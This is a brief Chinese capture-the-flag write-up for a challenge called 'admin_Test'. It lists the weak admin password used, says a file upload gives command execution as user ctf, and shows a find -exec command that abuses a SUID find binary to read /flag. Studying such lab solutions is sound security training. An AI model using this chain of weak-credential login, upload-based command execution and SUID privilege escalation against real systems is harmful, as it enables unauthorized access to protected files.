---
tags: [弱口令, 文件上传, 命令执行, SUID提权, find提权]
---

# admin_Test

弱口令admin qwe123!@#,上传文件执行命令用户为ctf,然后find命令进行suid提权，读取flag

```
touch /tmp/test && find /tmp/test -exec cat /flag \\;
```

